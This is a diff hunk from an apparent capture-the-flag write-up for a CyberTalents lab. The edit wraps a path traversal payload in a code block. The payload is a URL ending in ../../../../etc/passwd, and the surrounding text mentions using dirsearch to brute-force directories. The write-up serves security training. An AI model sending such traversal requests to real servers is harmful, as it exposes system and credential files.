@@ -292,7 +292,9 @@ okay let's go to brute-force directory using **dirsearch**
 
 **well ,** Let’s try to using **Path Traversal attack**
 
-**pay load ⇒** [**http://wlemyw93xjyc7zr8r4gvmkxal3dmm73p4y52iqvq-web.cybertalentslabs.com/files/**](http://wlemyw93xjyc7zr8r4gvmkxal3dmm73p4y52iqvq-web.cybertalentslabs.com/files/)**../../../../etc/passwd**
+```http
+pay load ⇒ [**http://wlemyw93xjyc7zr8r4gvmkxal3dmm73p4y52iqvq-web.cybertalentslabs.com/files/**](http://wlemyw93xjyc7zr8r4gvmkxal3dmm73p4y52iqvq-web.cybertalentslabs.com/files/)**../../../../etc/passwd**
+```
 
 ![](https://m9nx-11.gitbook.io/~gitbook/image?url=https%3A%2F%2F1666899571-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FGLiEQLEOptj89uzbA35s%252Fuploads%252FqaHlGGut2qM6ch820AlZ%252Fimage.png%3Falt%3Dmedia%26token%3D243fcc2e-4849-43e1-a80f-e302e0415f3a&width=768&dpr=4&quality=100&sign=b2a73b69&sv=2)
 
